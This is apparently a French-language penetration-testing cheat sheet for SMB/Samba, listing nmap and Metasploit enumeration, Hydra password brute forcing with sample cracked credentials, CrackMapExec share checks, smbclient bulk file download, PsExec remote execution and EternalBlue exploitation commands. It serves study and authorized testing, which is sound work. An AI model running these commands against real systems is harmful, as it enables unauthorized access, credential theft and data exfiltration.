# ðŸ“ Ã‰numÃ©ration SMB/Samba

[â† Retour Ã  la table des matiÃ¨res](../README.md)

## Port par dÃ©faut : 445

## Nmap Scripts SMB
```bash
nmap -p445 --script smb-protocols targetIP
nmap -p445 --script smb-security-mode targetIP
nmap -p445 --script smb-enum-sessions targetIP
nmap -p445 --script smb-enum-shares targetIP
nmap --script smb-os-discovery.nse -p 445 targetIP
```

## Metasploit Modules
```bash
use scanner/smb/smb_enumusers
use scanner/smb/smb_login
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_version
```

## Sessions anonymes
```bash
smbclient -L targetIP -N
rpcclient -U "" -N targetIP
```

## Enum4linux
```bash
enum4linux -a targetIP
```

## Hydra Bruteforce â†’ [ðŸ“– Guide Hydra](../06-tools/hydra.md)
```bash
# Bruteforce SMB
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

## CrackMapExec - Ã‰numÃ©ration des shares â†’ [ðŸ“– Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# VÃ©rifier les permissions des shares avec des credentials
crackmapexec smb targetIP -u administrator -p password --shares
```

## Connexion aux shares â†’ [ðŸ“– Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion au share C$ (nÃ©cessite des privilÃ¨ges admin)
smbclient //targetIP/C$ -U administrator

# Connexion Ã  un share spÃ©cifique
smbclient //targetIP/sharename -U username
```

## MÃ©thodologie d'attaque SMB complÃ¨te

### Ã‰tape 1 : Bruteforce initial â†’ [ðŸ“– Guide Hydra](../06-tools/hydra.md)
```bash
# DÃ©couverte des credentials avec Hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

**RÃ©sultats typiques :**
```
[445][smb] host: targetIP   login: rooty   password: spongebob
[445][smb] host: targetIP   login: demo   password: password1
[445][smb] host: targetIP   login: auditor   password: hellokitty
[445][smb] host: targetIP   login: administrator   password: pineapple
```

### Ã‰tape 2 : Ã‰numÃ©ration des shares par utilisateur â†’ [ðŸ“– Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# Tester chaque credential trouvÃ© pour lister les shares
crackmapexec smb targetIP -u rooty -p spongebob --shares
crackmapexec smb targetIP -u demo -p password1 --shares
crackmapexec smb targetIP -u auditor -p hellokitty --shares
crackmapexec smb targetIP -u administrator -p pineapple --shares
```

### Ã‰tape 3 : Connexion et exploration â†’ [ðŸ“– Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion avec le compte ayant le plus de privilÃ¨ges (gÃ©nÃ©ralement administrator)
smbclient //targetIP/C$ -U administrator

# Si C$ n'est pas accessible, tester d'autres shares dÃ©couverts
smbclient //targetIP/Users -U username
smbclient //targetIP/shared -U username
```

### Ã‰tape 4 : Commandes dans smbclient
```bash
# Une fois connectÃ© au share SMB :
ls                    # Lister les fichiers
cd directory         # Changer de rÃ©pertoire
get filename         # TÃ©lÃ©charger un fichier
put localfile        # Upload un fichier
mget *.txt          # TÃ©lÃ©charger plusieurs fichiers
recurse ON          # Activer la rÃ©cursion
prompt OFF          # DÃ©sactiver les confirmations
mget *              # TÃ©lÃ©charger tout rÃ©cursivement
```

## Analyse des permissions

### InterprÃ©tation des rÃ©sultats CrackMapExec
```bash
# Exemple de sortie crackmapexec --shares :
# ADMIN$    Disk      Remote Admin           READ,WRITE
# C$        Disk      Default share          READ,WRITE  
# IPC$      IPC       Remote IPC             READ
# Users     Disk      Users Directory        READ
```

**LÃ©gende des permissions :**
- `READ` : Lecture seule
- `WRITE` : Ã‰criture possible
- `READ,WRITE` : AccÃ¨s complet
- `NO ACCESS` : Aucun accÃ¨s

### PrioritÃ©s d'exploration
1. **C$** : AccÃ¨s au systÃ¨me de fichiers complet (admin requis)
2. **ADMIN$** : RÃ©pertoire Windows/System32 (admin requis)  
3. **Users** : RÃ©pertoires utilisateurs (souvent accessible)
4. **Shares personnalisÃ©s** : Peuvent contenir des donnÃ©es sensibles

## Script de bruteforce des shares
```bash
#!/bin/bash
TARGET="targetIP"
WORDLIST="/root/Desktop/wordlists/shares.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

## SMB avec PsExec (nÃ©cessite des credentials lÃ©gitimes)

### Test de login SMB
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run
```

### PsExec avec Impacket
```bash
# ExÃ©cution directe
psexec.py administrator@targetIP cmd.exe
```

### PsExec avec Metasploit
```bash
use exploit/windows/smb/psexec
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run
# Obtention d'un meterpreter
```

## MS17-010 EternalBlue

### DÃ©tection de la vulnÃ©rabilitÃ©
```bash
# Nmap script de dÃ©tection
nmap -sV -p 445 --script=smb-vuln-ms17-010 targetIP

# Scanner Metasploit
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS targetIP
run
```

### Exploitation EternalBlue
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS targetIP
run